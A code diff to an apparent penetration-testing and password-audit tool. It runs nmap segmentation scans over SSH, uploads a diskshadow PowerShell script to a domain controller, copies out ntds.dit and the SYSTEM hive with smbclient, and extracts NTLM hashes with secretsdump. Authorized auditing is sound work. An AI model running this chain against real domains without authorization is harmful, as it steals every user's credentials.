@@ -65,11 +65,11 @@ def process_host(host_config):
 
     for scan in scans:
         if len(scan_file) == 0:
-            scan_file = f'sudo nmap {scan.get('nmap_args', '-dd -T4 -sS -sV -p- --min-rate=500')} -oA segtest/{scan['scan_name']}.tcp {scan['target']}'
-            scan_file += f'\nsudo nmap {scan.get('nmap_args', '-dd -T4 -sU -p- --min-rate=1000')} -oA segtest/{scan['scan_name']}.udp {scan['target']}'
+            scan_file = f'sudo nmap {scan.get('nmap_args', '-dd -T4 -sS -sV -p- --min-rate=500')} -oA segtest/{scan.get('scan_name', scan['target'])}.tcp {scan['target']}'
+            scan_file += f'\nsudo nmap {scan.get('nmap_args', '-dd -T4 -sU -p- --min-rate=1000')} -oA segtest/{scan.get('scan_name', scan['target'])}.udp {scan['target']}'
         else:
-            scan_file += f'\nsudo nmap {scan.get('nmap_args', '-dd -T4 -sS -sV -p- --min-rate=500')} -oA segtest/{scan['scan_name']}.tcp {scan['target']}'
-            scan_file += f'\nsudo nmap {scan.get('nmap_args', '-dd -T4 -sU -p- --min-rate=1000')} -oA segtest/{scan['scan_name']}.udp {scan['target']}'
+            scan_file += f'\nsudo nmap {scan.get('nmap_args', '-dd -T4 -sS -sV -p- --min-rate=500')} -oA segtest/{scan.get('scan_name', scan['target'])}.tcp {scan['target']}'
+            scan_file += f'\nsudo nmap {scan.get('nmap_args', '-dd -T4 -sU -p- --min-rate=1000')} -oA segtest/{scan.get('scan_name', scan['target'])}.udp {scan['target']}'
 
     return scan_file
 
@@ -172,7 +172,7 @@ def validate_access(config):
                 print(color_text("      WARNING: Privileged scan requires sudo without password!", Color.RED))
 
     if not wrong_stuff:
-        print(color_text("\nAll systems go! All requirements are met.", Color.GREEN))
+        print(color_text("\nAll requirements are met.", Color.GREEN))
     else:
         print(color_text("\nWARNING: Some requirements are missing. See above for details.", Color.RED))
         exit()
@@ -201,12 +201,12 @@ def start_nmaps(scan_file, host):
         xargs = f'xargs -P 2'
 
     command = 'cat segtest/full_nmap.xargs | '+xargs+' -I {} sh -c "{}"'
-    tmux_command = f"tmux new-session -d -s 'seg-scans' '{command}'"
+    tmux_command = f"tmux new-session -d -s 'nmap-scans' '{command}'"
     execute = run_ssh_command(host_name, tmux_command)
 
-    print(f"\nScan started in tmux session 'nmap_scan' on {host_name}!")
+    print(f"\nScan started in tmux session 'nmap_scans' on {host_name}!")
     print(f"Results will be saved to ~/segtest directory on the remote host.")
-    print(f"\nTo attach to the tmux session: \nssh {host_name} && tmux attach -t seg-scans")
+    print(f"\nTo attach to the tmux session: \nssh {host_name} && tmux attach -t nmap-scans")
 
 def checker(host):
     for targets in host['scans']:
@@ -246,11 +246,11 @@ def en_users(jh, dc_ip, user, password, domain):
     if len(en[2]) != 0:
         print(en[2])
         exit()
-    print('Enabled users dumped.')
+    print(color_text('Enabled users dumped.\n', Color.GREEN))
     en_adm = run_ssh_command(jh, command2)
-    print('High privilege users gathered!')
+    print(color_text('High privilege users gathered!\n', Color.GREEN))
     us_desc = run_ssh_command(jh, command3)
-    print('Users and their description gathered!')
+    print(color_text('Users and their description gathered!', Color.GREEN))
 
     # create local directory
     create_local_dir = ['mkdir', f'users-dump']
@@ -434,53 +434,44 @@ echo 'copy z:\Windows\System32\config\SYSTEM C:\Windows\Temp\copy-system.hive' |
 # Run DiskShadow with script and capture output
 diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
 '''
+    netexec = run_ssh_command(jh, 'command -v nxc')
+    if len(netexec[1]) == 0:
+        print(color_text('\nThe following tool is missing: netexec\n',Color.RED))
+            # print('Tool error:\n', netexec[2])
+        print(color_text("If nxc/netexec is actually installed/in path(this problem is usually cause by pipx netexec installs), then fix it by adding it in the global path with this:", Color.BOLD),"\n\necho 'export PATH=$PATH:~/.local/bin' >> ~/.zshenv  # For zsh \nor \necho 'export PATH=$PATH:~/.local/bin' >> ~/.profile # For bash")
+        exit()
+    smbclient = run_ssh_command(jh, 'command -v smbclient')
+    if len(smbclient[1]) == 0:
+        print(color_text('\nThe following tool is missing: smbclient\n',Color.RED))
 
     with open(f'audit.ps1', 'w') as f:
             f.write(powershell_code)
             
-    # print(powershell_code)
     if jh:
         if '@' in user:
             user = user.split('@')[0]
 
-        netexec = run_ssh_command(jh, 'command -v nxc')
-        if len(netexec[1]) == 0:
-            print(color_text('\nThe following tool is missing: netexec\n',Color.RED))
-            # print('Tool error:\n', netexec[2])
-            print(color_text("If nxc/netexec is actually installed/in path(this problem is usually cause by pipx netexec installs), then fix it by adding it in the global path with this:", Color.BOLD),"\n\necho 'export PATH=$PATH:~/.local/bin' >> ~/.zshenv  # For zsh \nor \necho 'export PATH=$PATH:~/.local/bin' >> ~/.profile # For bash")
-            exit()
         script = copy_files('audit.ps1', f'{jh}:~/audit.ps1')
 
-        command1 = r"nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --put-file audit.ps1 \\\\Windows\\\\Temp\\\\audit.ps1"
-
-        # print(command1)color_text("\nAll systems go! All requirements are met.", Color.GREEN, BOLD, END, yellow)
         print(color_text('\nUploading audit.ps1 file to the target.\n', Color.BOLD))
 
         command12 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'put audit.ps1 Windows/Temp/audit.ps1'"
 
         cp_audit = run_ssh_command(jh, command12)
         time.sleep(1)
-        # if '[-]' in cp_audit[1]:
-        #     print(color_text('Credentials are not working. This is the netexec output:\n\n', Color.RED), cp_audit[1])
-        #     # print(cp_audit[1])
-        #     exit()
         
         command2 =  "nxc winrm "+dc_ip+" -u '"+user+"' -p '"+password+r"' -X 'C:\Windows\Temp\audit.ps1'"
         
-        print(color_text('\nRunning diskshadow.\n', Color.BOLD))
+        print(color_text('Running diskshadow.\n', Color.BOLD))
         run_audit = run_ssh_command(jh, command2)        
         if verbose:
             print(command2)
             print(run_audit[1])
 
-        #command31 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\SYSTEM.hive ntds-dump\SYSTEM.hive"
-        # command32 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\copy-system.hive ntds-dump\\copy-system.hive"
         command322 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/copy-system.hive ntds-dump/copy-system.hive'"
-        # command33 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\ntds.dit ntds-dump\\ntds.dit"
         command333 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/ntds.dit ntds-dump/ntds.dit'"
 
-        print('diskshadow done, grabbing files over on the jumphost')
-        #jh_grab_audit1 = run_ssh_command(jh, command31)
+        print(color_text('Diskshadow done, grabbing files over on the jumphost...\n', Color.GREEN))
         jh_grab_audit2 = run_ssh_command(jh, command322)
         jh_grab_audit3 = run_ssh_command(jh, command333)
         if verbose:
@@ -488,30 +479,58 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
             print('\n', jh_grab_audit2[1], '\n', jh_grab_audit3[1], '\n')
         
         # create local directory
-        create_local_dir = ['mkdir', 'password-audit']
+        create_local_dir = ['mkdir', 'ntds']
         create = subprocess.run(create_local_dir, capture_output=True, text=True)
 
-        print('grabbing files over from jumphost')
-        grab_audit1 = copy_files(f'{jh}:~/ntds-dump/ntds.dit', 'password-audit/.')
-        grab_audit2 = copy_files(f'{jh}:~/ntds-dump/copy-system.hive', 'password-audit/.')
-        # grab_audit3 = copy_files(f'{jh}:~/SYSTEM.hive', 'password-audit/.')   
-
-        print('Grabbing enabled users and high priv users. If fails only run users module.')
+        print(color_text('Grabbing files over from jumphost...\n', Color.BOLD))
+        grab_audit1 = copy_files(f'{jh}:~/ntds-dump/ntds.dit', 'ntds/.')
+        grab_audit2 = copy_files(f'{jh}:~/ntds-dump/copy-system.hive', 'ntds/.')
+          
+        print(color_text('Grabbing enabled users and high priv users. If fails only run users module.\n', Color.BOLD))
         users = en_users(jh, dc_ip, user, password, domain)
 
-        print('Everything seemed to work well. Now you have the necessary files to perform your password audit.')        
+        print(color_text('\nApparently everything went well?\n', Color.GREEN))        
 
         if is_tool_installed('impacket-secretsdump'):
-            print('\nDumping the ntlm hashes using impacket-secretsdump.')
-            command = ['impacket-secretsdump', '-system', 'password-audit/copy-system.hive', '-ntds', 'password-audit/ntds.dit', 'LOCAL', '-outputfile', 'ntlm-dumps']
+            print(color_text('\nDumping the ntlm hashes using impacket-secretsdump locally...\n', Color.BOLD))
+             # create local directory
+            create_local_dir = ['mkdir', 'ntlms']
+            create = subprocess.run(create_local_dir, capture_output=True, text=True)
+            command = ['impacket-secretsdump', '-system', 'ntds/copy-system.hive', '-ntds', 'ntds/ntds.dit', '-just-dc-ntlm', '-history', 'LOCAL', '-outputfile', 'ntlms/ntlm-dumps']
             running = subprocess.run(command, capture_output=True, text=True)
-            print('\nNtlm hashes dumped!')
-        if is_tool_installed('secretsdump.py'):
-            print('\nDumping the ntlm hashes using secretsdump.py.')
-            command = ['secretsdump.py', '-system', 'password-audit/copy-system.hive', '-ntds', 'password-audit/ntds.dit', 'LOCAL', '-outputfile', 'ntlm-dumps']
-            running = subprocess.run(command, capture_output=True, text=True)
-            print('\nNtlm hashes dumped!')
+            print(color_text('\nNtlm hashes dumped! That was easy, right?', Color.GREEN))
 
+        if is_tool_installed('secretsdump.py'):
+            print(color_text('\nDumping the ntlm hashes using secretsdump.py locally...\n', Color.BOLD))
+             # create local directory
+            create_local_dir = ['mkdir', 'ntlms']
+            create = subprocess.run(create_local_dir, capture_output=True, text=True)
+            command = ['secretsdump.py', '-system', 'ntds/copy-system.hive', '-ntds', 'ntds/ntds.dit', '-just-dc-ntlm', '-history', 'LOCAL', '-outputfile', 'ntlms/ntlm-dumps']
+            running = subprocess.run(command, capture_output=True, text=True)
+            print(color_text('\nNtlm hashes dumped! That was easy, right?', Color.GREEN))
+
+
+        enabled_users_list = None
+        with open(f'users-dump/enabled_users', 'r') as f:
+            enabled_users_list = set(line.strip().lower() for line in f if line.strip())
+
+        with open('ntlms/ntlm-dumps.ntds', 'r', encoding='utf-8', errors='ignore') as f, open('ntlms/enabled-only-ntlm.ntds', 'w') as out:
+            for line in f:
+                line = line.strip()
+
+                if not line:
+                    continue
+
+                username = line.split(':', 1)[0].lower()
+
+                if '\\' in username:
+                    username = username.split('\\')[1]
+                if '_history' in username:
+                    username = username.split('_history')[0]
+
+                if username in enabled_users_list:
+                    out.write(line + '\n')
+        
     else:
         print('jumphost not provided, this side of the module is not ready yet.')
 
@@ -569,7 +588,7 @@ def main():
     pasaudit_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")
     pasaudit_parser.add_argument("-verbose", "-v", required=False, action=argparse.BooleanOptionalAction, help="Verbose output. You will see each running command and it's output.")
     
-    parse_parser = subparsers.add_parser("parse", help="Parse nmap output.")
+    parse_parser = subparsers.add_parser("parse", help="Parse nmap output. - Not ready yet. It does nothing :).")
     parse_parser.add_argument("--nmap-output", "-n", required=True, help="Path to nmap output directory or file.")
 
     args = parser.parse_args()
